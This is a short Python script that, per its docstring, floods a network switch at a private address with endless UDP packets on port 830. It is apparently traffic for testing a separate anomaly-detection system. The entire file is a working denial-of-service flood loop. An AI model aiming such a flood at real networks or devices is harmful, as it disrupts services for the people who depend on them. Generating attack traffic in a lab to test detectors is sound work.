"""
Flood a switch with UDP packets.

This should run on a different PC than the anomaly detection.
"""

import socket 
import random

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1024) 
ip = "172.16.3.205" # Switch IP
port = 830

sent = 1
while True: 
    sock.sendto(bytes,(ip,port))
    print (f"Sent {sent} packets to {ip} at port {port}")
    sent += 1